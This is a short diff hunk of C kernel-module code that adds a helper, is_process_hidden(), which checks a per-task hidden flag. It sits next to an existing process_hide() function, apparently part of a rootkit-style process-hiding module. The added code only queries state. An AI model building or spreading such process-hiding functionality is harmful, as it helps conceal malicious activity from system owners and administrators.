@@ -75,6 +75,16 @@ static struct task_struct* find_process(pid_t pid)
  *  Public functions.
  ******************************************************************************/
 
+int is_process_hidden(pid_t pid)
+{
+    struct task_struct* p_task = NULL;
+    p_task = find_process(pid);
+    if (p_task == NULL) {
+        return 0;
+    }
+    return IS_PROC_HIDDEN(p_task);
+}
+
 long process_hide(pid_t pid)
 {
     struct task_struct* p_task = NULL;
